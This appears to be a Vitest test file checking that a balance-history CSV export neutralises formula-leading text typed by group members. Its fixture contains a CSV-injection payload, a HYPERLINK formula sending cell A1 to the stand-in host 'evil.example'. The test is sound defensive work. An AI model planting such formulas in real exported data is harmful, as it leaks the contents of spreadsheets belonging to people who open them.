import { describe, expect, it } from 'vitest';
import { generateBalanceHistoryCSV } from '@/lib/export';

// Titles and names in a group's history are typed by its members. Opened in a
// spreadsheet, a cell starting with = + - or @ runs as a formula (quoting the
// CSV field doesn't stop it): "CSV injection".
const exported = () => generateBalanceHistoryCSV({
    userName: 'Alice, =cmd',
    groupName: 'Goa, 2026',
    groupEmoji: '🏖️',
    currentBalance: -1_000,
    routeSummary: '@Bob pays you',
    exportDate: new Date('2026-10-01T00:00:00.000Z'),
    entries: [{
        date: '2026-09-30T18:40:00.000Z',
        eventType: 'expense',
        sourceLabel: '=HYPERLINK("https://evil.example/?"&A1,"Refund")',
        beforeBalance: 0,
        delta: -1_000,
        afterBalance: -1_000,
        counterparties: ['+Bob', 'Carol'],
        explanation: '-1 for "dinner"',
    }],
});

describe('balance history CSV', () => {
    it('shows text a member typed as text, never as a formula', () => {
        const row = exported().split('\n').at(-1)!;

        expect(row).toContain('"\'=HYPERLINK(""https://evil.example/?""&A1,""Refund"")"');
        expect(row).toContain('"\'+Bob, Carol"');
        expect(row).toContain('"\'-1 for ""dinner"""');
    });

    it('keeps amounts as numbers a spreadsheet can add up, negative ones included', () => {
        const row = exported().split('\n').at(-1)!;

        expect(row).toContain(',0.00,-10.00,-10.00,');
    });

    it('keeps each value in the header lines in its own cell', () => {
        const lines = exported().split('\n');

        expect(lines[0]).toBe('"# Balance Journey for Alice, =cmd"');
        expect(lines[1]).toBe('# Group,"🏖️ Goa, 2026"');
        expect(lines[3]).toBe('# Current Route,"\'@Bob pays you"');
    });
});
